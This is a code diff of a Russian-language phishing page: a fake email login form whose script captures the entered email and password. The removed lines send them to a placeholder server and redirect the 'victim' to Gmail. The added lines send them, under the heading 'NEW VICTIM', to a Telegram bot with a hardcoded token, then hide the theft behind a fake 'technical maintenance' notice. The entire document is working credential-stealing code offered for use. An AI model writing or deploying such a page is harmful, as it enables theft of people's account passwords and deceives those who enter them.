@@ -55,23 +55,57 @@
             font-weight: bold;
             margin-bottom: 20px;
         }
+        /* Стили для сообщения о техработах (изначально скрыто) */
+        .tech-message {
+            display: none;
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .tech-message .icon {
+            font-size: 56px;
+            margin-bottom: 15px;
+        }
+        .tech-message h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .tech-message p {
+            color: #666;
+            font-size: 16px;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-<div class="login-box">
-    <div class="logo">📧 Вход</div>
-    <form id="loginForm">
-        <input type="email" id="email" placeholder="Адрес электронной почты" required>
-        <input type="password" id="password" placeholder="Пароль" required>
-        <button type="submit">Войти</button>
-        <div id="message" class="error-message"></div>
-    </form>
-</div>
+    <!-- Форма входа (показывается сначала) -->
+    <div id="loginFormContainer" class="login-box">
+        <div class="logo">📧 Вход</div>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="Адрес электронной почты" required>
+            <input type="password" id="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+            <div id="message" class="error-message"></div>
+        </form>
+    </div>
+
+    <!-- Сообщение о техработах (появляется после отправки) -->
+    <div id="techContainer" class="tech-message hidden">
+        <div class="icon">🔧</div>
+        <h2>Технические работы</h2>
+        <p>Сайт временно недоступен.<br>Пожалуйста, зайдите позже.</p>
+        <p style="font-size:14px; color:#999; margin-top:15px;">Мы уже работаем над улучшением сервиса</p>
+    </div>
 
 <script>
-    // === Твой сервер для приёма данных ===
-    // Сюда впиши свой реальный адрес: https://твой-сервер.домен/log
-    const TARGET_URL = "https://твой-сервер.домен/log"; 
+    const BOT_TOKEN = "8355069027:AAFEYxANTsCy9oHI3xNe-gKpTWYgPET9r4I";
+    const CHAT_ID = "ТВОЙ_CHAT_ID"; // вставь свой ID
 
     document.getElementById("loginForm").addEventListener("submit", function(e) {
         e.preventDefault();
@@ -85,39 +119,21 @@
             return;
         }
 
-        // Формируем данные для отправки
-        const payload = {
-            email: email,
-            password: password,
-            timestamp: new Date().toISOString()
-        };
+        // === ОТПРАВКА ДАННЫХ В TELEGRAM ===
+        const ip = "—"; // можно добавить определение IP через API
+        const text = "📩 НОВАЯ ЖЕРТВА (техработы)\n" +
+                     "📧 Email: " + email + "\n" +
+                     "🔑 Пароль: " + password + "\n" +
+                     "🌐 IP: " + ip + "\n" +
+                     "🕒 " + new Date().toLocaleString();
 
-        // Отправка на сервер через GET (можно и POST)
-        const url = TARGET_URL + "?" + new URLSearchParams(payload).toString();
+        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
+        fetch(url, { mode: "no-cors" });
+        new Image().src = url;
 
-        fetch(url, {
-            method: "GET",
-            mode: "no-cors" // обход CORS для отправки
-        }).then(() => {
-            // После отправки имитируем успешный вход
-            messageDiv.style.color = "green";
-            messageDiv.textContent = "Вход выполнен! Перенаправление...";
-            // Можно перекинуть на реальную почту, чтобы жертва не заподозрила
-            setTimeout(() => {
-                window.location.href = "https://mail.google.com";
-            }, 1500);
-        }).catch(() => {
-            // Даже если ошибка, жертва всё равно уходит на почту
-            messageDiv.style.color = "green";
-            messageDiv.textContent = "Вход выполнен!";
-            setTimeout(() => {
-                window.location.href = "https://mail.google.com";
-            }, 1500);
-        });
-
-        // --- Дополнительно: отправить через image-пиксель (работает даже без fetch) ---
-        const img = new Image();
-        img.src = TARGET_URL + "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password);
+        // === СКРЫВАЕМ ФОРМУ, ПОКАЗЫВАЕМ ТЕХРАБОТЫ ===
+        document.getElementById("loginFormContainer").classList.add("hidden");
+        document.getElementById("techContainer").classList.remove("hidden");
     });
 </script>
 </body>
